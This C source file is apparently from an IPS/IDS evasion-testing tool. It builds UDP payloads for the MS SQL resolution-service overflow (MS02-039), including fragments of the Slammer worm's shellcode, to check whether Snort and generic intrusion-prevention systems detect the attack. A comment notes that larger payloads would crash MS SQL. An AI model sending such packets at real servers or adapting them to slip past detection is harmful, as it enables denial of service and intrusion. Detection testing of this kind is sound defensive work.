/* Copyright© 2004-2008 Nelson Brito
 * This file is part of the NNG Private Tool by Nelson Brito.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.  
   
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef PAYLOAD_C__
#define PAYLOAD_C__ 1
/* Nelson Brito <nbrito@sekure.org>
   $Id: payload.c,v 1.1 2008-09-13 13:42:46-03 nbrito Exp $ */
#include "common.h"

/* Payload processing routine. 
   Returns the payload structure to be sent by sendraw(). */
const struct payload process_payload(register u_int32_t id, register u_int32_t number, register u_int32_t option){
	/* Add as many payloads for MS02-039 as you want.
	   
	   Just becareful with the saize of the payload, because if it reachs 60 bytes
	   it will run into DoS against MS SQL, and it becomes a real attack. :-)

	   The gotcha here is fill the length, whether IPS test it, with NULL. And
	   beleive, it works! */
	struct payload payload [] = {
		{
			"Snort (Snort)",
			"CAN-2002-0649",
			"\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
			105,
			IPPORT_ANY,
			IPPORT_SSRP,
			IPPROTO_UDP
		},
		{	
			"Snort (Snort)",
			"CAN-2002-0649",
			"\x04\x00\x00\x00\x68\x6f\x75\x6e\x74\x68\x69\x63\x6b\x00\x00",
			15,
			IPPORT_ANY,
			IPPORT_SSRP,
			IPPROTO_UDP
		},
		{
			"Generic (Generic IPS)",
			"CAN-2002-0649",
			"\x04\x00\x00\x00\x3a\x0a\x0d\x2f\x5c\x3a\x00\x01\x02\x03\x04"
			"\x05\x06\x07\x08\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x68\x2e\x64\x6c\x6c\x68\x65\x6c\x33\x32\x68\x6b\x65\x72\x6e"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\x00\xdc\xc9\xb0\x42\x00\x00\x00\x00",
			105,
			IPPORT_ANY,
			IPPORT_SSRP,
			IPPROTO_UDP
		},
	};

	/* Processing payload options. */
	switch(option){
		case PROCESS_USER_PAYLOAD:
			/* Warning unlisted payload. */
			if(id >= sizeof(payload)/sizeof(struct payload)){
				printf("unknown or unlisted PID %d\n", id);
				exit(EXIT_FAILURE);
			}
			break;
		case PROCESS_ALL_PAYLOADS:
			id = (sizeof(payload)/sizeof(struct payload));
			break;
		case DISPLAY_ALL_PAYLOADS:
			printf("\n\t%-15s%-20s%-20s\n", "PID", "REFERENCE", "VENDOR (NIPS/NIDS)");
			id = sizeof(payload)/sizeof(struct payload);
			while(id--)
				printf("\t%-15d%-20s%-20s\n", id, payload[id].reference, payload[id].nips);
			printf("\n");
			exit(EXIT_SUCCESS);
			break;
		default:
			printf("unknown options %d processing payloads\n", option);
			exit(EXIT_FAILURE);
			break;
	}
	
	
	/* Setting payload EQUALS id MOD number minus 1. */
	if(id == (sizeof(payload)/sizeof(struct payload)));
		id = (number % id);
	
	return(payload[id]);
}
#endif  /* PAYLOAD_C__ */
